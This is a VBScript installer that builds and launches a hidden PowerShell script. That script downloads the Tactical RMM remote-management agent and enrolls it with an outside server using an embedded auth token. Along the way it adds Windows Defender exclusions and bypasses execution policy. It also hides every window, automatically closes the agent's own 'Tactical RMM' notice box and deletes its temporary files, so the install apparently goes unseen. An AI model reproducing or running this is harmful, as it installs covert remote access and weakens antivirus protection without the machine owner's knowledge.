' ============================================================
' tactical.vbs
' Elevated (UAC prompt once) then fully silent installer
' for Tactical RMM Agent.
'  - Single UAC prompt at the start (unavoidable by design)
'  - Hides the Inno Setup and tacticalrmm.exe console windows
'  - Watches for and auto-hides/dismisses the agent's native
'    "Tactical RMM" post-install MessageBox
'  - Cleanup is fault-tolerant so a locked/missing temp file
'    can't crash the script after the real work is done
' ============================================================

Dim objShell, objShellApp, objFSO, tempFolder, ps1Path, donePath, psExe, psArgs, psScript

Set objShell    = CreateObject("WScript.Shell")
Set objShellApp = CreateObject("Shell.Application")
Set objFSO      = CreateObject("Scripting.FileSystemObject")

tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
ps1Path    = tempFolder & "\tacticalagent-install.ps1"
donePath   = tempFolder & "\tacticalagent-install.done"

' Clear any stale marker from a previous run
On Error Resume Next
If objFSO.FileExists(donePath) Then objFSO.DeleteFile donePath, True
On Error Goto 0

' --------------------------------------------------------
' Build the PowerShell script text
' --------------------------------------------------------
psScript = _
"$innosetup = 'tacticalagent-v2.11.0-windows-amd64.exe'" & vbCrLf & _
"$api = '""https://api.cacgreatchallange.org""'" & vbCrLf & _
"$clientid = '1'" & vbCrLf & _
"$siteid = '1'" & vbCrLf & _
"$agenttype = '""server""'" & vbCrLf & _
"$power = 0" & vbCrLf & _
"$rdp = 0" & vbCrLf & _
"$ping = 0" & vbCrLf & _
"$auth = '""e47377c55d03d2147d91e2a9e6ae8834e710f774496d0eae3c8050ca6b2fa288""'" & vbCrLf & _
"$downloadlink = 'https://github.com/amidaware/rmmagent/releases/download/v2.11.0/tacticalagent-v2.11.0-windows-amd64.exe'" & vbCrLf & _
"$apilink = $downloadlink.split('/')" & vbCrLf & _
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12" & vbCrLf & _
"$serviceName = 'tacticalrmm'" & vbCrLf & _
"" & vbCrLf & _
"$watcherJob = Start-Job -ScriptBlock {" & vbCrLf & _
"    Add-Type -Namespace Win32 -Name WinApi -MemberDefinition @'" & vbCrLf & _
"        [DllImport(""user32.dll"", SetLastError=true, CharSet=CharSet.Auto)]" & vbCrLf & _
"        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);" & vbCrLf & _
"        [DllImport(""user32.dll"")]" & vbCrLf & _
"        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);" & vbCrLf & _
"        [DllImport(""user32.dll"")]" & vbCrLf & _
"        public static extern bool PostMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);" & vbCrLf & _
"'@" & vbCrLf & _
"    $timeout = (Get-Date).AddMinutes(5)" & vbCrLf & _
"    while ((Get-Date) -lt $timeout) {" & vbCrLf & _
"        $hwnd = [Win32.WinApi]::FindWindow($null, 'Tactical RMM')" & vbCrLf & _
"        if ($hwnd -ne [IntPtr]::Zero) {" & vbCrLf & _
"            [Win32.WinApi]::ShowWindow($hwnd, 0) | Out-Null" & vbCrLf & _
"            Start-Sleep -Milliseconds 100" & vbCrLf & _
"            [Win32.WinApi]::PostMessage($hwnd, 0x0010, 0, 0) | Out-Null" & vbCrLf & _
"            break" & vbCrLf & _
"        }" & vbCrLf & _
"        Start-Sleep -Milliseconds 50" & vbCrLf & _
"    }" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"If (Get-Service $serviceName -ErrorAction SilentlyContinue) {" & vbCrLf & _
"    write-host ('Tactical RMM Is Already Installed')" & vbCrLf & _
"} Else {" & vbCrLf & _
"    $OutPath = $env:TMP" & vbCrLf & _
"    $output = $innosetup" & vbCrLf & _
"    $installArgs = @('-m install --api ', ""$api"", '--client-id', $clientid, '--site-id', $siteid, '--agent-type', ""$agenttype"", '--auth', ""$auth"")" & vbCrLf & _
"    if ($power) { $installArgs += ""--power"" }" & vbCrLf & _
"    if ($rdp) { $installArgs += ""--rdp"" }" & vbCrLf & _
"    if ($ping) { $installArgs += ""--ping"" }" & vbCrLf & _
"    Try {" & vbCrLf & _
"        $DefenderStatus = Get-MpComputerStatus | select AntivirusEnabled" & vbCrLf & _
"        if ($DefenderStatus -match ""True"") {" & vbCrLf & _
"            Add-MpPreference -ExclusionPath 'C:\Program Files\TacticalAgent\*'" & vbCrLf & _
"            Add-MpPreference -ExclusionPath 'C:\Program Files\Mesh Agent\*'" & vbCrLf & _
"            Add-MpPreference -ExclusionPath 'C:\ProgramData\TacticalRMM\*'" & vbCrLf & _
"            Add-MpPreference -ExclusionProcess 'C:\Windows\Temp\is-*.tmp\tacticalagent*'" & vbCrLf & _
"        }" & vbCrLf & _
"    } Catch {}" & vbCrLf & _
"    $X = 0" & vbCrLf & _
"    do {" & vbCrLf & _
"      Write-Output ""Waiting for network""" & vbCrLf & _
"      Start-Sleep -s 5" & vbCrLf & _
"      $X += 1" & vbCrLf & _
"    } until(($connectresult = Test-NetConnection $apilink[2] -Port 443 | ? { $_.TcpTestSucceeded }) -or $X -eq 3)" & vbCrLf & _
"    if ($connectresult.TcpTestSucceeded -eq $true){" & vbCrLf & _
"        Try {" & vbCrLf & _
"            Invoke-WebRequest -Uri $downloadlink -OutFile $OutPath\$output" & vbCrLf & _
"            Start-Process -FilePath $OutPath\$output -ArgumentList ('/VERYSILENT /SUPPRESSMSGBOXES') -WindowStyle Hidden -Wait" & vbCrLf & _
"            write-host ('Extracting...')" & vbCrLf & _
"            Start-Sleep -s 7" & vbCrLf & _
"            Start-Process -FilePath ""C:\Program Files\TacticalAgent\tacticalrmm.exe"" -ArgumentList $installArgs -WindowStyle Hidden -Wait" & vbCrLf & _
"        } Catch {" & vbCrLf & _
"            $ErrorMessage = $_.Exception.Message" & vbCrLf & _
"            $FailedItem = $_.Exception.ItemName" & vbCrLf & _
"            Write-Error -Message ""$ErrorMessage $FailedItem""" & vbCrLf & _
"        } Finally {" & vbCrLf & _
"            Remove-Item -Path $OutPath\$output -ErrorAction SilentlyContinue" & vbCrLf & _
"        }" & vbCrLf & _
"    } else {" & vbCrLf & _
"        Write-Output ""Unable to connect to server""" & vbCrLf & _
"    }" & vbCrLf & _
"}" & vbCrLf & _
"" & vbCrLf & _
"Wait-Job $watcherJob -Timeout 10 | Out-Null" & vbCrLf & _
"Remove-Job $watcherJob -Force -ErrorAction SilentlyContinue" & vbCrLf & _
"New-Item -Path '" & Replace(donePath, "\", "\\") & "' -ItemType File -Force | Out-Null"

' --------------------------------------------------------
' Write the PowerShell script to a temp .ps1 file
' --------------------------------------------------------
Dim ts
Set ts = objFSO.CreateTextFile(ps1Path, True, False)
ts.Write psScript
ts.Close

' --------------------------------------------------------
' Launch elevated (single UAC prompt), then fully hidden
' --------------------------------------------------------
psExe  = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
psArgs = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & ps1Path & """"

objShellApp.ShellExecute psExe, psArgs, "", "runas", 0

' --------------------------------------------------------
' Wait for completion by polling for the marker file
' Timeout after 10 minutes as a safety net
' --------------------------------------------------------
Dim waited
waited = 0
Do While Not objFSO.FileExists(donePath)
    WScript.Sleep 1000
    waited = waited + 1
    If waited >= 600 Then Exit Do
Loop

' --------------------------------------------------------
' Clean up — wrapped in On Error Resume Next so a file
' already removed by AV or a race condition never crashes
' the script after the real install work is already done
' --------------------------------------------------------
On Error Resume Next
objFSO.DeleteFile ps1Path, True
objFSO.DeleteFile donePath, True
On Error Goto 0

Set objFSO = Nothing
Set objShellApp = Nothing
Set objShell = Nothing
